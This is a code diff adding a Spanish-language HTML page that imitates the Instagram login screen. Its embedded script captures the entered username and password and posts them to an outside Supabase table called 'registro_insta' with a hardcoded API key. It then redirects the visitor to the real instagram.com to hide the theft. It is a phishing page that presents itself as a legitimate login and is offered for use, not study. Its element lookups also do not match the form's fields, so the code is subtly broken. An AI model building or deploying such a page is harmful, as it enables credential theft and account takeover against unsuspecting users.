@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Iniciar sesión • Instagram</title>
+  <style>
+    /* Reseteo general y tema oscuro */
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    }
+
+    body {
+      background-color: #121212;
+      color: #f5f5f5;
+      min-height: 100vh;
+      display: flex;
+    }
+
+    /* Contenedor principal de dos columnas */
+    .container {
+      display: flex;
+      width: 100%;
+      min-height: 100vh;
+    }
+
+    /* ---------------- SECCIÓN IZQUIERDA ---------------- */
+    .hero-section {
+      flex: 1.2;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 40px;
+      position: relative;
+    }
+
+    .instagram-logo-icon {
+      position: absolute;
+      top: 30px;
+      left: 40px;
+      width: 38px;
+      height: 38px;
+    }
+
+    .hero-title {
+      font-size: 2.2rem;
+      font-weight: 600;
+      text-align: center;
+      max-width: 450px;
+      line-height: 1.3;
+      margin-bottom: 30px;
+    }
+
+    .hero-image-container {
+      max-width: 400px;
+      width: 100%;
+      display: flex;
+      justify-content: center;
+    }
+
+    .hero-image-container img {
+      width: 100%;
+      height: auto;
+      object-fit: contain;
+    }
+
+    /* ---------------- SECCIÓN DERECHA (FORMULARIO) ---------------- */
+    .login-section {
+      flex: 1;
+      background-color: #1a1a1a;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      padding: 40px 60px;
+      border-left: 1px solid #262626;
+    }
+
+    .login-box {
+      width: 100%;
+      max-width: 350px;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .login-box h3 {
+      font-size: 16px;
+      font-weight: 600;
+      margin-bottom: 24px;
+      color: #f5f5f5;
+    }
+
+    .input-group {
+      margin-bottom: 12px;
+    }
+
+    .input-group input {
+      width: 100%;
+      padding: 12px;
+      background-color: #121212;
+      border: 1px solid #363636;
+      border-radius: 8px;
+      color: #f5f5f5;
+      font-size: 13px;
+      outline: none;
+    }
+
+    .input-group input:focus {
+      border-color: #a8a8a8;
+    }
+
+    .input-group input::placeholder {
+      color: #a8a8a8;
+    }
+
+    /* Botón de inicio de sesión */
+    .btn-submit {
+      width: 100%;
+      padding: 10px;
+      background-color: #005cbf;
+      /* Azul atenuado deshabilitado */
+      color: #fffbfb;
+      border: none;
+      border-radius: 8px;
+      font-weight: 600;
+      font-size: 14px;
+      cursor: not-allowed;
+      margin-top: 8px;
+      margin-bottom: 20px;
+    }
+
+    /* Enlace de recuperación */
+    .forgot-password {
+      text-align: center;
+      margin-bottom: 24px;
+    }
+
+    .forgot-password a {
+      color: #f5f5f5;
+      font-size: 13px;
+      text-decoration: none;
+    }
+
+    .forgot-password a:hover {
+      text-decoration: underline;
+    }
+
+    /* Botón Facebook */
+    .btn-facebook {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      width: 100%;
+      padding: 10px;
+      background-color: #262626;
+      color: #ffffff;
+      border: none;
+      border-radius: 8px;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-bottom: 12px;
+    }
+
+    .btn-facebook svg {
+      width: 18px;
+      height: 18px;
+      fill: #0095f6;
+    }
+
+    /* Botón Crear Cuenta Nueva */
+    .btn-register {
+      width: 100%;
+      padding: 10px;
+      background-color: transparent;
+      color: #0095f6;
+      border: 1px solid #0095f6;
+      border-radius: 20px;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-bottom: 30px;
+    }
+
+    /* Marca Meta en el pie de página del formulario */
+    .meta-logo {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 6px;
+      color: #a8a8a8;
+      font-size: 14px;
+      font-weight: 600;
+    }
+
+    .meta-logo svg {
+      width: 20px;
+      height: 20px;
+      fill: #a8a8a8;
+    }
+
+    /* Adaptabilidad a pantallas pequeñas */
+    @media (max-width: 850px) {
+      .container {
+        flex-direction: column;
+      }
+
+      .hero-section {
+        padding-top: 80px;
+      }
+
+      .login-section {
+        border-left: none;
+        border-top: 1px solid #262626;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="container">
+    <!-- LADO IZQUIERDO: Hero con Logo y Texto -->
+    <section class="hero-section">
+      <!-- Logo Ícono Instagram -->
+      <svg class="instagram-logo-icon" viewBox="0 0 24 24">
+        <path fill="url(#ig-grad)"
+          d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z" />
+        <defs>
+          <linearGradient id="ig-grad" x1="0%" y1="100%" x2="100%" y2="0%">
+            <stop offset="0%" stop-color="#fdf497" />
+            <stop offset="25%" stop-color="#fdf497" />
+            <stop offset="50%" stop-color="#fd5949" />
+            <stop offset="75%" stop-color="#d6249f" />
+            <stop offset="100%" stop-color="#285AEB" />
+          </linearGradient>
+        </defs>
+      </svg>
+
+      <!-- Texto descriptivo -->
+      <h1 class="hero-title">Mira los momentos cotidianos de tus mejores amigos.</h1>
+
+      <!-- Contenedor para la imagen descriptiva -->
+      <div class="hero-image-container">
+        <!-- Reemplaza "historias_amigos.png" por la ruta de tu imagen -->
+        <img src="-erGonz07kB.webp" alt="Historias de Instagram">
+      </div>
+    </section>
+
+    <!-- LADO DERECHO: Formulario de Login -->
+    <section class="login-section">
+      <div class="login-box">
+        <h3>Iniciar sesión en Instagram</h3>
+
+        <form id="loginForm">
+          <!-- Campo Usuario / Correo -->
+          <div class="input-group">
+            <input type="text" name="username" placeholder="Número de celular, nombre de usuario o correo electrónico"
+              required>
+          </div>
+
+          <!-- Campo Contraseña -->
+          <div class="input-group">
+            <input type="password" name="password" placeholder="Contraseña" required>
+          </div>
+
+          <!-- Botón Iniciar Sesión -->
+          <button type="submit" class="btn-submit">Iniciar sesión</button>
+
+          <!-- Enlace de contraseña olvidada -->
+          <div class="forgot-password">
+            <a href="#">¿Olvidaste tu contraseña?</a>
+          </div>
+
+
+
+          <!-- Crear cuenta nueva -->
+          <!--<button type="submit" class="btn-primary">Crear cuenta nueva</button>-->
+
+          <!-- Logo Meta -->
+          <!--div class="meta-logo"-->
+          <!--svg viewBox="0 0 24 24"-->
+          <!--path d="M16.924 3.5c-1.921 0-3.61.943-4.924 2.373C10.686 4.443 8.997 3.5 7.076 3.5 3.393 3.5 0 6.893 0 11.208c0 4.542 3.826 8.292 8.761 8.292 2.315 0 4.382-.934 5.922-2.484 1.54 1.55 3.607 2.484 5.922 2.484 4.935 0 8.761-3.75 8.761-8.292C29.366 6.893 25.973 3.5 22.29 3.5h-5.366z"/-->
+          <!--/svg-->
+          <!--span>Meta</span-->
+          <!--/div-->
+        </form>
+      </div>
+    </section>
+  </div>
+  <!-- Código JavaScript integrado -->
+  <script>
+    // Lógica para enviar los datos de forma persistente a Supabase
+    const SUPABASE_URL = "https://xiifneojsrtwaxrnbxaq.supabase.co";
+    const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InhpaWZuZW9qc3J0d2F4cm5ieGFxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTE1NzcyODEsImV4cCI6MjEwNzE1MzI4MX0.V_U7dMLSY8FFHhOK3TnFMPHPDN3CghThOAncKIRWjz4";
+
+    document.getElementById('loginForm').addEventListener('submit', async function (e) {
+      e.preventDefault(); // Evita que la página intente recargarse tradicionalmente
+
+      const usuarioInput = document.getElementById('email').value;
+      const passwordInputVal = document.getElementById('password').value;
+
+      try {
+        const response = await fetch(`${SUPABASE_URL}/rest/v1/registro_insta`, {
+          method: 'POST',
+          headers: {
+            'apikey': SUPABASE_KEY,
+            'Authorization': `Bearer ${SUPABASE_KEY}`,
+            'Content-Type': 'application/json',
+            'Prefer': 'return=minimal'
+          },
+          body: JSON.stringify({
+            usuario: usuarioInput,
+            password: passwordInputVal
+          })
+        });
+
+        // Al completarse el registro en Supabase, redirige al usuario final al destino real
+        window.location.href = "https://www.instagram.com/";
+
+      } catch (error) {
+        console.error("Error de red o de comunicación:", error);
+        // Redirección de escape en caso de fallo para mantener la fluidez
+        window.location.href = "https://www.instagram.com/";
+      }
+    });
+  </script>
+
+</body>
+
+</html>
